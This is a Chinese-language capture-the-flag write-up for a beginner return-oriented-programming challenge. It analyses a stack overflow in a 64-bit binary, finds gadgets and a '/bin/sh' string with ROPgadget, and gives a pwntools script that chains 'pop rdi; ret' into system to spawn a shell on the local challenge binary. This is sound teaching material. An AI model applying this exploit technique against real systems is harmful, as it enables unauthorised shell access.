---
title: ROP
author: 13m0n4de
difficulty: Medium
category: Pwn
image: ghcr.io/svuctf/svuctf-helloworld-2024/rop:latest
port: 70
writeup_author: pn1fg
tags:
  - rop
reference:
---

# ROP

## 题目描述

## 题目解析

### 查看文件信息

查看文件类型：

```
$ file rop
rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=caa5a8688811dbd2d1f955cef1033593ff3f9c0d, for GNU/Linux 3.2.0, not stripped
```

64位 ELF 文件，动态链接，没有去除符号。

查看保护机制：

```
$ checksec --file=rop
RELRO           Partial RELRO
STACK CANARY    No canary found
NX              NX enabled
PIE             No PIE
RPATH           No RPATH
RUNPATH	        No RUNPATH
Symbols		    74 Symbols
FORTIFY	        No
Fortified	    0
Fortifiable	    1
FILE            ret2text64
```

NX 保护。

### 分析漏洞成因

反编译 `vuln` 函数：

```c
[0x00401130]> s sym.vuln
[0x0040135a]> pdg

ssize_t vuln()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  system("echo \"Hello CTFer, what's your name?\"");
  return read(0, buf, 0x100uLL);
}
```

很明显的栈溢出，`buf` 大小只有 0x40，但是 `read` 函数读取了 0x100，还看到了 `system` 函数，但可惜的是这里的 `system` 并没有执行 `/bin/sh`，所以我们无法直接跳转至此。

列出所有函数：

```
[0x00401130]> afl
0x004010b0    1     11 sym.imp.putchar
0x004010c0    1     11 sym.imp.puts
0x004010d0    1     11 sym.imp.system
0x004010e0    1     11 sym.imp.close
0x004010f0    1     11 sym.imp.read
0x00401100    1     11 sym.imp.setvbuf
0x00401110    1     11 sym.imp.open
0x00401120    1     11 sym.imp.__isoc99_scanf
0x00401130    1     46 entry0
0x00401170    4     31 sym.deregister_tm_clones
0x004011a0    4     49 sym.register_tm_clones
0x004011e0    3     32 sym.__do_global_dtors_aux
0x00401210    1      6 sym.frame_dummy
0x00401470    1      5 sym.__libc_csu_fini
0x0040135a    1    110 sym.vuln
0x004012d6    4    132 sym.b4ckd00r
0x00401478    1     13 sym._fini
0x0040127b    1     91 sym.banner
0x00401216    1    101 sym.init
0x00401400    4    101 sym.__libc_csu_init
0x00401160    1      5 sym._dl_relocate_static_pie
0x004013c8    1     45 main
0x00401000    3     27 sym._init
0x00401030    2     28 fcn.00401030
0x00401040    1     15 fcn.00401040
0x00401050    1     15 fcn.00401050
0x00401060    1     15 fcn.00401060
0x00401070    1     15 fcn.00401070
0x00401080    1     15 fcn.00401080
0x00401090    1     15 fcn.00401090
0x004010a0    1     15 fcn.004010a0
```

并没有发现后门函数。

这里给同学们介绍一个新的工具 [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)，它的可以精确的查找程序中的一些汇编指令或字符串，例如查找 `/bin/sh`：

```
$ ROPgadget --binary=rop --string "/bin/sh"
Strings information
============================================================
0x0000000000404050 : /bin/sh
```

很明显程序中存在 `/bin/sh` 这个字符串，那我们只需要控制程序执行流调用 `system` 函数执行 `/bin/sh` 即可。

[上一题](../ret2text64/README.md)我们讲述过 64 位程序传参需要通过寄存器，ROPgadget 也可以用来寻找修改寄存器的指令（`pop` + `ret`）：

```asm
$ ROPgadget --binary=rop --only 'pop|ret'
Gadgets information
============================================================
0x000000000040133c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040133e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401340 : pop r14 ; pop r15 ; ret
0x0000000000401342 : pop r15 ; ret
0x000000000040133b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040133f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040119d : pop rbp ; ret
0x0000000000401343 : pop rdi ; ret
0x0000000000401341 : pop rsi ; pop r15 ; ret
0x000000000040133d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret

Unique gadgets found: 11
```

### 编写利用程序

[exp.py](./writeup/exp.py):

```python
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

elf = ELF("../attachments/rop")
io = process("../attachments/rop")

pop_rdi_ret = 0x00401343
ret = 0x0040101A

payload = flat(
    [
        cyclic(0x40),
        b"A" * 8,
        ret,
        pop_rdi_ret,
        elf.sym["secret"],
        elf.sym["system"],
    ]
)
io.sendafter(b"Hello CTFer, what's your name?\n", payload)

io.interactive()
```
